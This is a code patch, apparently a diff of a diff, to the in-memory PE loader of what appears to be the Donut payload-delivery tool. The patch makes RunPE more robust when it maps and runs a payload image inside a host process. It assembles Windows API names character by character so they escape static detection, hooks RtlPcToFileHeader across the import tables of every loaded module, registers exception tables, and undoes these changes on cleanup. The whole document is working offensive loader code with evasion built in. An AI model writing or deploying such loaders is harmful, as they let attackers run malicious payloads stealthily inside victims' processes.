@@ -1,6 +1,8 @@
+diff --git a/loader/inmem_pe.c b/loader/inmem_pe.c
+index 59fc467..a07315b 100644
 --- a/loader/inmem_pe.c
 +++ b/loader/inmem_pe.c
-@@ -40,11 +40,165 @@
+@@ -40,11 +40,225 @@ typedef struct _IMAGE_RELOC {
      WORD type   :4;
  } IMAGE_RELOC, *PIMAGE_RELOC;
  
@@ -26,6 +28,30 @@
 +    p[6]='o'; p[7]='F';  p[8]='i';  p[9]='l';  p[10]='e'; p[11]='H';
 +    p[12]='e'; p[13]='a'; p[14]='d'; p[15]='e'; p[16]='r'; p[17]=0;
 +}
++
++static void name_rtldeletefunctiontable(volatile char *p) {
++    p[0]='R';  p[1]='t';  p[2]='l';  p[3]='D';  p[4]='e';  p[5]='l';
++    p[6]='e';  p[7]='t';  p[8]='e';  p[9]='F';  p[10]='u'; p[11]='n';
++    p[12]='c'; p[13]='t'; p[14]='i'; p[15]='o'; p[16]='n'; p[17]='T';
++    p[18]='a'; p[19]='b'; p[20]='l'; p[21]='e'; p[22]=0;
++}
++
++// One IAT slot redirected to the pc2f stub, kept so it can be restored when the
++// payload unloads. Without this the host keeps calling into a stub whose page is
++// freed (and whose address range may be reused), corrupting exception handling
++// in unrelated modules.
++#define PC2F_MAX_PATCHES 256
++typedef struct {
++    PULONG_PTR slot;   // address of the IAT entry
++    ULONG_PTR  orig;   // value before redirection
++} PC2F_PATCH;
++
++typedef struct {
++    PVOID      stub;                  // the allocated stub page (NULL if none)
++    ULONG_PTR  orig;                  // real RtlPcToFileHeader
++    DWORD      count;                 // number of recorded patches
++    PC2F_PATCH patches[PC2F_MAX_PATCHES];
++} PC2F_HOOK;
 +
 +#endif
 +
@@ -88,7 +114,7 @@
 +    return s;
 +}
 +
-+static void patch_pc2f_module(PDONUT_INSTANCE inst, PVOID base, DWORD importRVA, PVOID stub) {
++static void patch_pc2f_module(PDONUT_INSTANCE inst, PVOID base, DWORD importRVA, PVOID stub, PC2F_HOOK *hook) {
 +    PIMAGE_IMPORT_DESCRIPTOR imp;
 +    PIMAGE_THUNK_DATA oft, ft;
 +    PIMAGE_IMPORT_BY_NAME ibn;
@@ -109,14 +135,43 @@
 +            if (_strcmp((const char*)ibn->Name, target) != 0) continue;
 +            if (ft->u1.Function == (ULONG_PTR)stub) continue;
 +            if (inst->api.VirtualProtect(&ft->u1.Function, sizeof(ULONG_PTR), PAGE_READWRITE, &old)) {
-+                ft->u1.Function = (ULONG_PTR)stub;
++                // Record the original value so unhook can restore it. If the
++                // record table is full, leave this slot unpatched rather than
++                // redirect it without a way back.
++                if (hook->count < PC2F_MAX_PATCHES) {
++                    hook->patches[hook->count].slot = &ft->u1.Function;
++                    hook->patches[hook->count].orig = ft->u1.Function;
++                    hook->count++;
++                    ft->u1.Function = (ULONG_PTR)stub;
++                }
 +                inst->api.VirtualProtect(&ft->u1.Function, sizeof(ULONG_PTR), old, &old);
 +            }
 +        }
 +    }
 +}
 +
-+static void hook_cxx_module_base(PDONUT_INSTANCE inst, PVOID cs, PIMAGE_NT_HEADERS nt) {
++// Restore every recorded IAT slot to its original value and free the stub page.
++// Called from the payload cleanup path so the host is left exactly as it was
++// found: no dangling pointer into freed memory, no leaked executable page.
++static void unhook_cxx_module_base(PDONUT_INSTANCE inst, PC2F_HOOK *hook) {
++    DWORD i, old;
++    if (hook->stub == NULL) return;
++    for (i = 0; i < hook->count; i++) {
++        // Only restore a slot that still points at our stub; if something else
++        // legitimately re-hooked it afterwards, leave that alone.
++        if (*hook->patches[i].slot == (ULONG_PTR)hook->stub) {
++            if (inst->api.VirtualProtect(hook->patches[i].slot, sizeof(ULONG_PTR), PAGE_READWRITE, &old)) {
++                *hook->patches[i].slot = hook->patches[i].orig;
++                inst->api.VirtualProtect(hook->patches[i].slot, sizeof(ULONG_PTR), old, &old);
++            }
++        }
++    }
++    inst->api.VirtualFree(hook->stub, 0, MEM_RELEASE);
++    hook->stub = NULL;
++    hook->count = 0;
++}
++
++static void hook_cxx_module_base(PDONUT_INSTANCE inst, PVOID cs, PIMAGE_NT_HEADERS nt, PC2F_HOOK *hook) {
 +    PPEB                    peb;
 +    PPEB_LDR_DATA           ldr;
 +    PLDR_DATA_TABLE_ENTRY   dte;
@@ -125,6 +180,10 @@
 +    PVOID                   orig, stub;
 +    char                    api[20], modname[12];
 +    HMODULE                 ntdll;
++
++    hook->stub = NULL;
++    hook->orig = 0;
++    hook->count = 0;
 +
 +    name_rtlpctofileheader(api);
 +    // Kernel32 exports a thunk through an IAT slot that the traversal below
@@ -140,6 +199,9 @@
 +                          (ULONG_PTR)cs + nt->OptionalHeader.SizeOfImage, orig);
 +    if (stub == NULL) return;
 +
++    hook->stub = stub;
++    hook->orig = (ULONG_PTR)orig;
++
 +    // Every loaded module that imports the function (vcruntime140[_1] for /MD,
 +    // and any other CRT a payload may use).
 +    peb = (PPEB)NtCurrentTeb()->ProcessEnvironmentBlock;
@@ -154,19 +216,43 @@
 +        mnt = RVA2VA(PIMAGE_NT_HEADERS, dte->DllBase, dos->e_lfanew);
 +        if (mnt->Signature != IMAGE_NT_SIGNATURE) continue;
 +        patch_pc2f_module(inst, dte->DllBase,
-+            mnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, stub);
++            mnt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, stub, hook);
 +    }
 +
 +    // The payload image is not in that list; patch its own IAT too (/MT).
 +    patch_pc2f_module(inst, cs,
-+        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, stub);
++        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, stub, hook);
 +}
 +#endif
 +
  // for setting the command line...
  typedef CHAR**  (WINAPI *p_acmdln_t)(VOID);
  typedef WCHAR** (WINAPI *p_wcmdln_t)(VOID);
-@@ -304,9 +458,12 @@
+@@ -56,7 +270,7 @@ BOOL CheckForILOnly(PIMAGE_NT_HEADERS nthost, ULONG_PTR host);
+ // In-Memory execution of unmanaged DLL file. YMMV with EXE files requiring subsystem..
+ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
+     PIMAGE_DOS_HEADER           dos, doshost;
+-    PIMAGE_NT_HEADERS           nt, nthost, ntnew, origmod;
++    PIMAGE_NT_HEADERS           nt, nthost, ntnew, origmod = NULL;
+     PIMAGE_SECTION_HEADER       sh;
+     PIMAGE_SECTION_HEADER       shcp = NULL;
+     PIMAGE_THUNK_DATA           oft, ft;
+@@ -95,7 +309,13 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
+     PVOID                       cs = NULL;
+     SIZE_T                      viewSize = 0;
+     BOOL                        has_reloc;
+-    
++#ifdef _WIN64
++    PC2F_HOOK                   cxx_hook;
++    PVOID                       ft_table = NULL;   // registered RUNTIME_FUNCTION table
++    DWORD                       ft_count = 0;
++    HMODULE                     ft_ntdll = NULL;   // ntdll handle for cleanup resolution
++#endif
++
+     base = mod->data;
+     dos  = (PIMAGE_DOS_HEADER)base;
+     nt   = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
+@@ -304,9 +524,12 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
          
          dll = xGetLibAddress(inst, name);
          
@@ -181,7 +267,7 @@
            
          // For each API
          for (;; oft++, ft++) {
-@@ -349,7 +506,11 @@
+@@ -349,7 +572,11 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
          dll = xGetLibAddress(inst, name);
          
          if(dll == NULL) continue;
@@ -194,7 +280,7 @@
          // Resolve the API for this library
          oft = RVA2VA(PIMAGE_THUNK_DATA, cs, del->ImportNameTableRVA);
          ft  = RVA2VA(PIMAGE_THUNK_DATA, cs, del->ImportAddressTableRVA);
-@@ -402,31 +563,49 @@
+@@ -402,31 +629,49 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
      }
  
      if (inst->decoy[0] == 0) {
@@ -255,7 +341,7 @@
  
      DPRINT("Setting permissions for each PE section");
      // done with binary manipulation, mark section permissions appropriately
-@@ -437,15 +616,16 @@
+@@ -437,15 +682,16 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
        BOOL isExecute = (shcp[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? TRUE : FALSE;
  
        if (isWrite & isExecute)
@@ -277,7 +363,7 @@
        }
        else if (!isRead & !isWrite & isExecute)
            newprot = PAGE_EXECUTE;
-@@ -477,22 +657,77 @@
+@@ -477,22 +723,82 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
  
      inst->api.VirtualProtect(cs, ntc.OptionalHeader.BaseOfCode, PAGE_READONLY, &oldprot);
  
@@ -288,7 +374,7 @@
 +    // The 32-bit CRT does not use RtlPcToFileHeader for this; its own failure
 +    // (STATUS_INVALID_DISPOSITION) has a different, unattributed cause.
 +    #ifdef _WIN64
-+      hook_cxx_module_base(inst, cs, &ntc);
++      hook_cxx_module_base(inst, cs, &ntc, &cxx_hook);
 +    #endif
 +
 +#ifdef _WIN64
@@ -306,7 +392,6 @@
 +    if(rva != 0 && size >= sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)) {
 +      typedef BOOLEAN (NTAPI *RtlAddFunctionTable_t)(PIMAGE_RUNTIME_FUNCTION_ENTRY, DWORD, ULONG_PTR);
 +      RtlAddFunctionTable_t _RtlAddFunctionTable;
-+      HMODULE ntdll;
 +      char    modname[24];
 +      char    apiname[24];
 +
@@ -315,14 +400,20 @@
 +
 +      // The instance only carries the ntdll name when bypassing was requested.
 +      name_ntdll(modname);
-+      ntdll = inst->api.GetModuleHandleA(modname);
++      ft_ntdll = inst->api.GetModuleHandleA(modname);
 +      name_rtladdfunctiontable(apiname);
-+      _RtlAddFunctionTable = (RtlAddFunctionTable_t)inst->api.GetProcAddress(ntdll, apiname);
++      _RtlAddFunctionTable = (RtlAddFunctionTable_t)inst->api.GetProcAddress(ft_ntdll, apiname);
 +      if(_RtlAddFunctionTable != NULL) {
-+        if(!_RtlAddFunctionTable((PIMAGE_RUNTIME_FUNCTION_ENTRY)RVA2VA(PVOID, cs, rva),
-+                                 (DWORD)(size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)),
-+                                 (ULONG_PTR)cs)) {
++        ft_count = (DWORD)(size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY));
++        if(_RtlAddFunctionTable((PIMAGE_RUNTIME_FUNCTION_ENTRY)RVA2VA(PVOID, cs, rva),
++                                 ft_count, (ULONG_PTR)cs)) {
++          // Remember the table so cleanup can unregister it. Leaving it
++          // registered after the image is unmapped would point the unwinder at
++          // freed memory and crash the host on a later exception.
++          ft_table = RVA2VA(PVOID, cs, rva);
++        } else {
 +          DPRINT("RtlAddFunctionTable failed: %d", inst->api.GetLastError());
++          ft_count = 0;
 +        }
 +      }
 +    }
@@ -363,3 +454,69 @@
        if(callbacks) {
          while(*callbacks != NULL) {
            // call function
+@@ -504,11 +810,19 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
+     }
+ 
+     if(mod->type == DONUT_MODULE_DLL) {
+-      DllMain = RVA2VA(DllMain_t, cs, ntc.OptionalHeader.AddressOfEntryPoint);
+-      DPRINT("Executing entrypoint of DLL: %p", (PVOID)DllMain);
+-      DPRINT("HINSTANCE: %p\n\n", (PVOID)cs);
+-      DllMain(cs, DLL_PROCESS_ATTACH, NULL);
+-      
++      // A DLL may legitimately have no entry point (AddressOfEntryPoint == 0):
++      // resource-only DLLs and some export-only libraries. The OS loader skips
++      // DllMain for those; do the same instead of calling the image base. The
++      // named export below still runs.
++      if(ntc.OptionalHeader.AddressOfEntryPoint != 0) {
++        DllMain = RVA2VA(DllMain_t, cs, ntc.OptionalHeader.AddressOfEntryPoint);
++        DPRINT("Executing entrypoint of DLL: %p", (PVOID)DllMain);
++        DPRINT("HINSTANCE: %p\n\n", (PVOID)cs);
++        DllMain(cs, DLL_PROCESS_ATTACH, NULL);
++      } else {
++        DPRINT("DLL has no entry point; skipping DllMain");
++      }
++
+       // call exported api?
+       if(mod->method[0] != 0) {
+         DPRINT("Resolving address of %s", (char*)mod->method);
+@@ -597,16 +911,37 @@ VOID RunPE(PDONUT_INSTANCE inst, PDONUT_MODULE mod) {
+     }
+ 
+ pe_cleanup:
++#ifdef _WIN64
++    // Undo the exception-table registration and the C++ module-base hook before
++    // the image goes away, so the host is left as it was found. Order matters:
++    // unregister the function table while its memory is still mapped, restore
++    // the IAT slots, then free the stub page.
++    if(ft_table != NULL && ft_ntdll != NULL) {
++      typedef BOOLEAN (NTAPI *RtlDeleteFunctionTable_t)(PIMAGE_RUNTIME_FUNCTION_ENTRY);
++      RtlDeleteFunctionTable_t _RtlDeleteFunctionTable;
++      char apiname[24];
++      name_rtldeletefunctiontable(apiname);
++      _RtlDeleteFunctionTable = (RtlDeleteFunctionTable_t)inst->api.GetProcAddress(ft_ntdll, apiname);
++      if(_RtlDeleteFunctionTable != NULL) {
++        if(!_RtlDeleteFunctionTable((PIMAGE_RUNTIME_FUNCTION_ENTRY)ft_table)) {
++          DPRINT("RtlDeleteFunctionTable failed: %d", inst->api.GetLastError());
++        }
++      }
++      ft_table = NULL;
++    }
++    unhook_cxx_module_base(inst, &cxx_hook);
++#endif
++
+     // if memory allocated
+     if(cs != NULL) {
+       // release
+       DPRINT("Releasing memory");
+ 
+-      inst->api.VirtualFree(shcp, ntc.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER), MEM_RELEASE | MEM_DECOMMIT);
++      inst->api.VirtualFree(shcp, 0, MEM_RELEASE);
+ 
+       if (origmod != NULL)
+-        inst->api.VirtualFree(origmod, ntc.OptionalHeader.SizeOfHeaders, MEM_RELEASE | MEM_DECOMMIT);
+-      
++        inst->api.VirtualFree(origmod, 0, MEM_RELEASE);
++
+       inst->api.NtUnmapViewOfSection(inst->api.GetCurrentProcess(), cs);
+       inst->api.CloseHandle(hSection);
+     }
